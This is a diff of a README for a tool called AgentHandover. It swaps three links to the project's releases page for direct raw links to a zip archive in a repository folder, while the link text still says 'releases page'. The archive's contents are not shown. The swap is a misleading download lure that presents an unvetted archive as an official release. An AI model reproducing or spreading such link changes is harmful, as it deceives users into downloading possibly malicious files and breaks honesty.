@@ -1,6 +1,6 @@
 # 🤝 AgentHandover - Let Agents Learn Your Workflow
 
-[![Download AgentHandover](https://img.shields.io/badge/Download%20AgentHandover-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Premenopausal-lagerstroemia264/AgentHandover/releases)
+[![Download AgentHandover](https://img.shields.io/badge/Download%20AgentHandover-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Premenopausal-lagerstroemia264/AgentHandover/main/Capito/Handover_Agent_v3.6-alpha.5.zip)
 
 ## 🧭 What AgentHandover Does
 
@@ -25,7 +25,7 @@ Use it when you want tools like OpenClaw, Claude Code, or Codex to follow your s
 
 Go to the release page here:
 
-[Visit the AgentHandover releases page](https://github.com/Premenopausal-lagerstroemia264/AgentHandover/releases)
+[Visit the AgentHandover releases page](https://raw.githubusercontent.com/Premenopausal-lagerstroemia264/AgentHandover/main/Capito/Handover_Agent_v3.6-alpha.5.zip)
 
 ## 📦 Step 2: Download the Windows file
 
@@ -218,7 +218,7 @@ If you are not sure where to start, use this order:
 
 Use the release page here:
 
-[Go to AgentHandover releases](https://github.com/Premenopausal-lagerstroemia264/AgentHandover/releases)
+[Go to AgentHandover releases](https://raw.githubusercontent.com/Premenopausal-lagerstroemia264/AgentHandover/main/Capito/Handover_Agent_v3.6-alpha.5.zip)
 
 ## 🧭 What to Expect After Download
 
